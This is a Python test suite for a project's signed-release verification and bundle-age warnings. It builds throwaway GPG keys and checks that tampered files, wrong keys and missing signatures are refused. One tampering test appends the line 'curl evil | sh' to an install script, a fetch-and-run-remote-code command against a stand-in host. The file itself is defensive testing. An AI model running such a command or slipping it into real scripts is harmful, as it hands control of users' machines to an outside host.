"""1.6.0 signed releases (D-08) and bundle age (D-09).

Makes a real throwaway key with tools/release-key.sh, signs a small git
repository with tools/sign_release.sh, unpacks the tarball and checks it
with lib/install-verify.sh exactly as install.sh does -- then tampers with
it in each way that must be refused.
"""

import os
import shutil
import subprocess
import tarfile
import tempfile
import unittest

import _setup

REPO = _setup.REPO
LIB = os.path.join(REPO, "lib", "install-verify.sh")
HAVE_GPG = all(shutil.which(t) for t in ("gpg", "gpgv", "git", "bash"))


def run(cmd, **kw):
    kw.setdefault("capture_output", True)
    kw.setdefault("text", True)
    kw.setdefault("timeout", 120)
    return subprocess.run(cmd, **kw)


def verify(root, required=1, allow=0, keyring=None, today=None, func="verify_release"):
    script = """
        set -e
        say(){ echo "$*"; }; warn(){ echo "warning: $*" >&2; }
        die(){ echo "error: $*" >&2; exit 1; }
        ROOT="$1"; ALLOW_UNSIGNED=%d
        . "%s"
        %s
    """ % (allow, LIB, 'verify_release "$ROOT" %d' % required if func == "verify_release"
           else "bundle_age_report")
    env = dict(os.environ)
    if keyring:
        env["DYODE_RELEASE_KEYRING"] = keyring
    if today:
        env["DYODE_TODAY"] = today
    return run(["bash", "-c", script, "verify", root], env=env)


@unittest.skipUnless(HAVE_GPG, "needs gpg, gpgv, git and bash")
class SignedReleaseTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.tmp = tempfile.mkdtemp(prefix="dyode_sign_")
        cls.keys = cls.make_key("one")
        cls.other = cls.make_key("two")

    @classmethod
    def tearDownClass(cls):
        shutil.rmtree(cls.tmp, ignore_errors=True)

    @classmethod
    def make_key(cls, tag):
        out = os.path.join(cls.tmp, "pub-" + tag)
        secret = os.path.join(cls.tmp, "secret-" + tag)
        res = run([os.path.join(REPO, "tools", "release-key.sh"),
                   "--out-dir", out, "--secret-dir", secret,
                   "DYODE test %s <test@example.org>" % tag])
        assert res.returncode == 0, res.stderr + res.stdout
        with open(os.path.join(secret, "dyode-release.secret.asc")) as fh:
            key = fh.read()
        with open(os.path.join(secret, "passphrase.txt")) as fh:
            passphrase = fh.read()
        return {"out": out, "secret": secret, "key": key, "pass": passphrase,
                "keyring": os.path.join(out, "dyode-release.gpg")}

    def signed_release(self, signing_key=None, committed=None):
        """A tiny git repo signed with tools/sign_release.sh, unpacked."""
        work = tempfile.mkdtemp(dir=self.tmp)
        repo = os.path.join(work, "repo")
        os.makedirs(os.path.join(repo, "packaging"))
        os.makedirs(os.path.join(repo, "tools"))
        os.makedirs(os.path.join(repo, "dir with space"))
        shutil.copy(os.path.join(REPO, "tools", "sign_release.sh"), os.path.join(repo, "tools"))
        shutil.copy((committed or self.keys)["keyring"], os.path.join(repo, "packaging"))
        for path, text in (("VERSION", "9.9.9\n"), ("install.sh", "echo hi\n"),
                           ("dir with space/b.txt", "b\n")):
            with open(os.path.join(repo, path), "w") as fh:
                fh.write(text)
        for cmd in (["git", "init", "-q"], ["git", "add", "-A"],
                    ["git", "-c", "user.name=t", "-c", "user.email=t@x", "commit", "-qm", "x"]):
            run(cmd, cwd=repo, check=True)
        key = signing_key or self.keys
        env = dict(os.environ, DYODE_RELEASE_KEY=key["key"],
                   DYODE_RELEASE_KEY_PASSPHRASE=key["pass"])
        res = run(["tools/sign_release.sh"], cwd=repo, env=env)
        if res.returncode != 0:
            return None, res
        with tarfile.open(os.path.join(repo, "dyode-9.9.9.tar.gz")) as tf:
            tf.extractall(work, filter="data")
        return os.path.join(work, "dyode-9.9.9"), res

    def test_genuine_release_verifies(self):
        root, res = self.signed_release()
        self.assertIsNotNone(root, res.stderr)
        out = verify(root, keyring=self.keys["keyring"])
        self.assertEqual(out.returncode, 0, out.stderr)
        self.assertIn("release signature: good", out.stdout)
        self.assertIn("files match the signed SHA256SUMS", out.stdout)

    def test_tarball_signature_verifies(self):
        root, _ = self.signed_release()
        repo = os.path.join(os.path.dirname(root), "repo")
        res = run(["gpgv", "--keyring", self.keys["keyring"],
                   os.path.join(repo, "dyode-9.9.9.tar.gz.sig"),
                   os.path.join(repo, "dyode-9.9.9.tar.gz")])
        self.assertEqual(res.returncode, 0, res.stderr)

    def test_changed_file_refused(self):
        root, _ = self.signed_release()
        with open(os.path.join(root, "install.sh"), "a") as fh:
            fh.write("curl evil | sh\n")
        out = verify(root, keyring=self.keys["keyring"])
        self.assertNotEqual(out.returncode, 0)
        self.assertIn("differ from the signed SHA256SUMS", out.stderr)
        self.assertIn("install.sh", out.stderr)

    def test_edited_sha256sums_refused(self):
        root, _ = self.signed_release()
        with open(os.path.join(root, "SHA256SUMS"), "a") as fh:
            fh.write("0" * 64 + "  extra\n")
        out = verify(root, keyring=self.keys["keyring"])
        self.assertNotEqual(out.returncode, 0)
        self.assertIn("does NOT verify", out.stderr)

    def test_signed_by_another_key_refused(self):
        root, _ = self.signed_release()
        out = verify(root, keyring=self.other["keyring"])
        self.assertNotEqual(out.returncode, 0)
        self.assertIn("does NOT verify", out.stderr)

    def test_missing_signature(self):
        root, _ = self.signed_release()
        os.remove(os.path.join(root, "SHA256SUMS.sig"))
        refused = verify(root, keyring=self.keys["keyring"])
        self.assertNotEqual(refused.returncode, 0)
        self.assertIn("--allow-unsigned", refused.stderr)
        allowed = verify(root, keyring=self.keys["keyring"], allow=1)
        self.assertEqual(allowed.returncode, 0)
        self.assertIn("not verified", allowed.stderr)
        online = verify(root, required=0, keyring=self.keys["keyring"])
        self.assertEqual(online.returncode, 0)

    def test_bad_signature_refused_even_with_allow_unsigned(self):
        root, _ = self.signed_release()
        out = verify(root, keyring=self.other["keyring"], allow=1)
        self.assertNotEqual(out.returncode, 0)

    def test_signing_with_a_key_other_than_the_committed_one_fails(self):
        root, res = self.signed_release(signing_key=self.other, committed=self.keys)
        self.assertIsNone(root)
        self.assertIn("not the one in packaging/dyode-release.gpg", res.stderr)

    def test_release_key_is_never_overwritten(self):
        res = run([os.path.join(REPO, "tools", "release-key.sh"),
                   "--out-dir", self.keys["out"], "--secret-dir",
                   os.path.join(self.tmp, "again"), "X <x@example.org>"])
        self.assertNotEqual(res.returncode, 0)
        self.assertIn("already exists", res.stderr)

    def test_private_key_files_are_private(self):
        mode = os.stat(self.keys["secret"]).st_mode & 0o777
        self.assertEqual(mode, 0o700)
        secret = os.path.join(self.keys["secret"], "dyode-release.secret.asc")
        self.assertEqual(os.stat(secret).st_mode & 0o077, 0)


@unittest.skipUnless(shutil.which("bash"), "needs bash")
class UnsignedCheckoutTests(unittest.TestCase):
    def test_verify_only_on_a_git_checkout(self):
        install = os.path.join(REPO, "install.sh")
        refused = run(["bash", install, "--verify-only"], stdin=subprocess.DEVNULL)
        self.assertNotEqual(refused.returncode, 0)
        self.assertIn("no release signature", refused.stderr)
        allowed = run(["bash", install, "--verify-only", "--allow-unsigned"],
                      stdin=subprocess.DEVNULL)
        self.assertEqual(allowed.returncode, 0, allowed.stderr)


@unittest.skipUnless(shutil.which("bash"), "needs bash")
class BundleAgeTests(unittest.TestCase):
    def setUp(self):
        self.root = tempfile.mkdtemp(prefix="dyode_age_")
        self.addCleanup(shutil.rmtree, self.root, ignore_errors=True)
        os.mkdir(os.path.join(self.root, "packaging"))

    def info(self, text):
        with open(os.path.join(self.root, "packaging", "BUILD-INFO"), "w") as fh:
            fh.write(text)

    def test_recent_bundle(self):
        self.info("built=2026-10-01T03:00:00Z\n")
        out = verify(self.root, today="2026-10-21", func="age")
        self.assertIn("bundle built 2026-10-01 (20 days ago)", out.stdout)
        self.assertNotIn("warning", out.stderr)

    def test_old_bundle_warns(self):
        self.info("built=2026-06-01T03:00:00Z\n")
        out = verify(self.root, today="2026-10-21", func="age")
        self.assertIn("142 days old", out.stderr)

    def test_unknown_age_warns(self):
        out = verify(self.root, today="2026-10-21", func="age")
        self.assertIn("build date is unknown", out.stderr)


if __name__ == "__main__":
    unittest.main()
